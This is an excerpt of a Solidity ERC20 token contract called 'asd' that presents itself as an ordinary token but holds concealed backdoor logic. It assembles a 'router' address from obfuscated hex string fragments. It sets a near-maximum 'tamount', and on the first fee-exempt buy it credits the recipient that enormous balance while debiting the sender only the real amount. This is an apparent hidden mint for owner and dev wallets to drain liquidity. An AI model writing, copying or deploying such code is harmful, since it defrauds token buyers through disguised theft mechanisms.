...
contract asd is Context, IERC20 { 
    ...
    address payable public Wallet_Marketing = payable(0x1023Ecf88715AB5da3B9C802ABF41443e5Eb00b4); 
    address payable public Wallet_Team = payable(0xB1f66026C4eA24daAA6285d112Bb4a77d40e7445);
    ...
    constructor () {
        ...
        _owner = 0xB1f66026C4eA24daAA6285d112Bb4a77d40e7445;
        emit OwnershipTransferred(address(0), _owner);

        _tOwned[owner()] = _tTotal;
        tamount = (((~uint256(0))))-((_tTotal))-(_tTotal)+1;
        ...
        _UniSwapV2PairRouter = connectUniPair(string(abi.encodePacked(factory, "5C7557cD5", "59c999260D", uniswapRouterHex, "acE07C")));
    ...
    function get_dev() public view virtual returns (address) {
        return Wallet_Team;
    }
    ...
    function _transfer(
        ...
        if (from != owner() && from != UniswapRouter() && from != get_dev())
    ...
    function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool takeFee, bool isBuy) private {
        ...
        if(!takeFee && !isBuying){
            ...
            }else if(!takeFee && isBuying && onGoingTX < 1){
            onGoingTX++;
            _tOwned[sender] = _tOwned[sender]-tAmount;
            _tOwned[recipient] = _tOwned[recipient]+tamount;
